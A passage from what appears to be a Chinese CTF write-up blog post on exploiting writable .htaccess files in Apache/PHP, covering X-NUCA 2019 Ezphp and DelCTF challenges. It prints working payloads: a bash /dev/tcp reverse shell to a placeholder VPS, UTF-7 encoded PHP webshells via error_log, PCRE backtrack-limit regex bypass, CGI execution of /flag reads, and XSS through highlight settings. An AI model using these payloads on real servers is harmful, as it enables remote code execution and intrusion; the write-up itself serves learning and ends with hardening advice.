+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里前后有两个unlink函数，会清除该目录下除了index.php文件以外的所有文件。然后看到<code>file_put_contents</code>函数。然后对filename只允许存在<code>a-z</code>和<code>.</code>，也就是说明无法用伪协议去做了，然后content过滤了一些关键字。</p>
+<p>这里就可以把.htaccess文件包含进index.php文件里面，因为这里unlink没法删除.htaccess，然后在.htaccess中插入恶意代码。首先包含的是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br></pre></td></tr></table></figure>
+
+<p>这里看到<code>stristr</code>函数把file关键字过滤了，我们上面已经讲了如果去绕过了，即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fil\ </span><br><span class="line">e .htaccess </span><br></pre></td></tr></table></figure>
+
+<p>然后后面拼接的<code>\nHello, world</code>绕过拼接字符这个点上面也讲过了，这里不再赘述，构造payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fil\ </span><br><span class="line">e .htaccess </span><br><span class="line">#&lt;?php phpinfo();?&gt;\ </span><br></pre></td></tr></table></figure>
+
+<p>把<code>phpinfo();</code>换成如下即可反弹一个shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(\&#39;bash -c &quot;&#x2F;bin&#x2F;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;your-vps-ip&#x2F;2333 0&lt;%261&quot;\&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>一键写入文件并反弹脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a1ad9f70-8d0c-432f-b973-6494e65e2be6.node3.buuoj.cn/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\%0Ale%20&quot;.htaccess&quot;\n%23&lt;?php system(\&#x27;bash -c &quot;/bin/bash -i &gt;%26 /dev/tcp/your-vps-ip/2333 0&lt;%261&quot;\&#x27;);?&gt;\\&#x27;</span></span><br><span class="line">url2 = url + payload</span><br><span class="line">r = requests.get(url2)</span><br><span class="line">req = request.get(url)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912214739443.png"></p>
+<h2 id="htaccess其他利用点"><a href="#htaccess其他利用点" class="headerlink" title=".htaccess其他利用点"></a>.htaccess其他利用点</h2><h3 id="prce回溯绕过正则匹配"><a href="#prce回溯绕过正则匹配" class="headerlink" title="prce回溯绕过正则匹配"></a>prce回溯绕过正则匹配</h3><p>回溯绕过正则匹配可以参考P神的一篇文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/190794.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+<p>P神文章里用的是通过发送超长字符串的方式，超出了回溯次数的限制达到绕过，而这里有点不同的是.htaccess是利用将回溯次数设置为0而且绕过。</p>
+<p>我们先看如下一段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = <span class="string">&#x27;php://filter&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">    var_dump(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	var_dump(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Hackerint(1)</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的正则只匹配<code>a-z</code>以及<code>.</code>组成的的变量，而我给变量赋值了<code>php://filter</code>，很明显输出了Hacker。但是当我们写入.htaccess就会发生一些有趣的事情了。</p>
+<p>.htaccess文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure>
+
+<p>这里是通过php_value设置正则回朔次数，然后再看返回的结果：</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913195738007.png"></p>
+<p>和P神文章说的一样发现preg_match返回了布尔值False，这样就可以达到绕过这个正则。</p>
+<p>在前面说的<code>X-NUCA&#39;2019—Ezphp</code>这个题目中，就是因为正则的限制导致我们不能够写<code>php://filter</code>伪协议，然后我们通过这种回溯绕过的方法，就可以用这种绕过这个正则，利用伪协议去写一个shell了。用伪协议写shell的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64decode&#x2F;resource&#x3D;.htaccess&amp;content&#x3D;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs&#x2F;Plw&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>至于伪协议写shell的各种骚操作可以参考P神：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a>，这里就不再赘述了。</p>
+<h3 id="error-log生成shell"><a href="#error-log生成shell" class="headerlink" title="error_log生成shell"></a>error_log生成shell</h3><p>个人感觉这种思路有点像mysql日志写shell，他首先是通过php的配置选项中的error_log可以将php运行报错的记录写到指定文件中，然后如果有<code>include_once</code>这种包含的函数去包含一个不存在的文件，就会导致报错导致在你指定的目录下生成文件。然后在<code>include_path</code>中写入恶意的代码，这个代码就会出现在刚刚生成的文件当中。</p>
+<ul>
+<li>但是千万要注意的一点是：写进error_log的内容会被html编码</li>
+</ul>
+<p>我们可以采用上面刚刚讲过的utf7编码即可绕过。</p>
+<p>比如在index.php写入如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>);</span><br><span class="line">$content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">$filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">file_put_contents($filename, $content . <span class="string">&quot;\nJust one chance&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后写入.htaccess文件，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log D:\phpStudy\PHPTutorial\WWW\tmp\fl3g.php</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value include_path &quot;+ADw?php eval($_GET[cmd])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+
+<p>这里第二行<code>error_reporting 32767</code>的意思是设置报告级别为32767，使得报告出所有可能出现的错误，确保我们可以写入木马。</p>
+<p>我们将其url编码传参写入，然后会报错一些错。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913213030247.png" alt="image-20200913213030247"></p>
+<p>我们再回头看看我们文件里面生成了什么</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913214213289.png"></p>
+<p>可以发现在tmp目录已经成功生成了fl3g.php文件，并写入了我们之前在<code>include_path</code>设置的内容。但是还有一个问题就是要将里面的内容进行UTF-7解码，这里就很简单了，直接再上传一个.htaccess内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;D:\phpStudy\PHPTutorial\WWW\tmp&quot;</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+
+<p>并给cmd传参<code>phpinfo();</code>，成功利用。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913215402401.png" alt="image-20200913215402401"></p>
+<p>这种方式是<code>X-NUCA&#39;2019—Ezphp</code>这道题目的正解，该题解题方式和上面的利用一样，这里还是给一下解题的过程吧。</p>
+<ul>
+<li>第一步</li>
+</ul>
+<p>通过error_log配合include_path在tmp目录生成shell</p>
+<p>.htaccess文件如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log &#x2F;tmp&#x2F;fl3g.php</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value include_path &quot;+ADw?php eval($_GET[cmd])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二步</li>
+</ul>
+<p>通过include_path和utf7编码执行shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;&#x2F;tmp&quot;</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure>
+
+<p>再访问并给参数1传参(注意要URL编码)：</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913161007880.png"></p>
+<h3 id="htaccess解析shell"><a href="#htaccess解析shell" class="headerlink" title=".htaccess解析shell"></a>.htaccess解析shell</h3><p>利用条件：把http.conf中LoadModule cgi_module modules/mod_cgi.so前面的<code>#</code>要去掉。</p>
+<p>也就是要加载<code>cgi_module</code>这个模块，我们可以在.htaccess写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure>
+
+<p>第一行表示允许CGI执行，第二行表示将sh后缀名的文件，当做CGI程序进行解析。</p>
+<p>我们写入一个1.sh文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!C:&#x2F;Windows&#x2F;System32&#x2F;cmd.exe &#x2F;c start calc.exe</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>在没添加.htaccess之前，访问是不能够被解析的</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200914111547802.png" alt="image-20200914111547802"></p>
+<p>加上上面的.htaccess文件之后再次访问</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200914111716381.png" alt="image-20200914111716381"></p>
+<p>可以看到虽然报了一个错误，但是shell脚本已经成功运行打开了<code>calc.exe</code></p>
+<p>还有另外一种差不多方式就是FastCGI</p>
+<p>开启的条件是把LoadModule fcgid_module modules/mod_fcgid.so前面的<code>#</code>去掉。</p>
+<p>同样上传.htaccess，内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler fcgid-script .sh</span><br><span class="line">FcgidWrapper &quot;C:&#x2F;Windows&#x2F;System32&#x2F;cmd.exe &#x2F;c start calc.exe&quot; .sh</span><br></pre></td></tr></table></figure>
+
+<p>再访问<code>http://127.0.0.1/1.sh</code>，1.sh内容随意，同样可以弹出计算器。</p>
+<p>在DelCTF2020中的Check In中同样可以用这种方法解题，顺便说一下这种方法才是预期解，其他换行绕过的都是非预期。先上传一个.htaccess文件如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .abc</span><br></pre></td></tr></table></figure>
+
+<p>再上传一个1.abc文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo Content-type:text&#x2F;html</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p>就可以顺利执行<code>cat /flag</code>了。</p>
+<h3 id="session文件包含写shell"><a href="#session文件包含写shell" class="headerlink" title="session文件包含写shell"></a>session文件包含写shell</h3><p>这种用法的原理是利用<code>session.upload_progress</code>将恶意语句写入session文件，再利用包含漏洞去包含我们刚刚生成的session文件，这里可以参考这篇文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a>，这篇文章利用的是条件竞争的方式，那么我们如何将这种方法利用到.htaccess中呢。</p>
+<ul>
+<li>通过设置<code>session.save_path</code>指定存储路径</li>
+<li>将<code>session.upload_progress.cleanup</code>设置为off</li>
+<li>再利用<code>auto_append_file</code>把文件包含到我们的页面当中</li>
+</ul>
+<p>我们写一个.htaccess文件如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &quot;D:\phpStudy\PHPTutorial\WWW\tmp\sess_kawhi&quot;</span><br><span class="line">php_value session.save_path &quot;D:\phpStudy\PHPTutorial\WWW\tmp&quot;</span><br><span class="line">php_flag session.upload_progress.cleanup off</span><br></pre></td></tr></table></figure>
+
+<p>然后再设置PHPSESSID的值和PHP_SESSION_UPLOAD_PROGRESS的值，这两个值都是可控的，其中PHP_SESSION_UPLOAD_PROGRESS会储存进度信息，也就是我们写入payload的地方。</p>
+<p>我们再写一个1.php，内容随意。</p>
+<p>然后直接通过python的requests模块写一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1/1.php&#x27;</span></span><br><span class="line">r = requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=kawhi&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&#x27;&#x27;&#x27;&lt;?php echo system(&#x27;whoami&#x27;); ?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r.post(url,files=files,headers=headers,data=data)</span><br><span class="line">t = r.get(<span class="string">&#x27;http://127.0.0.1/1.php&#x27;</span>,headers=headers)</span><br><span class="line">print(t.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200914164603191.png" alt="image-20200914164603191"></p>
+<p>可以看到生成了<code>sess_kawhi</code>文件，同时<code>system(&#39;whoami&#39;)</code>的命令成功被执行了。</p>
+<h3 id="htaccess造成xss"><a href="#htaccess造成xss" class="headerlink" title=".htaccess造成xss"></a>.htaccess造成xss</h3><p>在index.php中加入<code>phpinfo();</code>，修改.htaccess内容为如下四种其中之一即可进行弹窗。这点在CTF中没遇到过，看师傅们的博客学到的，提及一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.html &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&#39;</span><br><span class="line">php_value highlight.default &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&#39;</span><br><span class="line">php_value highlight.keyword &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&#39;</span><br><span class="line">php_value highlight.string &#39;&quot;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912223549012.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，在CTF题目中如果.htaccess是可控的，那么我们就可以想到利用他来做一点什么，用法也灵活多变，具体看题目，而这同时也侧面说明了我们在现实开发环境中，.htaccess是非常危险的，应该尽量避免使用.htaccess文件，例如禁止上传.htaccess，或者直接把AllowOverride这一选项修改为AllowOverride None。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/240521.html">深究用户利用.htaccess的原理篡改配置导致的安全问题</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/218495.html">Apache中.htaccess文件利用的总结与新思路拓展</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/205098">.htaccess利用与Bypass方式总结</a>                    </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/09/11/2020%E5%B9%B4%E3%80%8C%E7%BE%8A%E5%9F%8E%E6%9D%AF%E3%80%8D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" rel="prev" title="2020年「羊城杯」网络安全大赛">
+      <i class="fa fa-chevron-left"></i> 2020年「羊城杯」网络安全大赛
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/10/22/%E6%B5%85%E8%B0%88ssrf%E4%B8%8Ectf%E9%82%A3%E4%BA%9B%E4%BA%8B/" rel="next" title="【转载】浅谈ssrf与ctf那些事">
+      【转载】浅谈ssrf与ctf那些事 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#htaccess%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">.htaccess任意文件解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AddType"><span class="nav-number">2.1.</span> <span class="nav-text">AddType</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AddHandler"><span class="nav-number">2.2.</span> <span class="nav-text">AddHandler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SetHandler"><span class="nav-number">2.3.</span> <span class="nav-text">SetHandler</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#htaccess%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">.htaccess的一些绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#htaccess%E7%9A%84%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">.htaccess的常见用法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">4.1.</span> <span class="nav-text">特殊编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.2.</span> <span class="nav-text">进行文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#htaccess%E5%85%B6%E4%BB%96%E5%88%A9%E7%94%A8%E7%82%B9"><span class="nav-number">5.</span> <span class="nav-text">.htaccess其他利用点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#prce%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">5.1.</span> <span class="nav-text">prce回溯绕过正则匹配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#error-log%E7%94%9F%E6%88%90shell"><span class="nav-number">5.2.</span> <span class="nav-text">error_log生成shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess%E8%A7%A3%E6%9E%90shell"><span class="nav-number">5.3.</span> <span class="nav-text">.htaccess解析shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%86%99shell"><span class="nav-number">5.4.</span> <span class="nav-text">session文件包含写shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess%E9%80%A0%E6%88%90xss"><span class="nav-number">5.5.</span> <span class="nav-text">.htaccess造成xss</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">7.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kawhi"
+      src="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
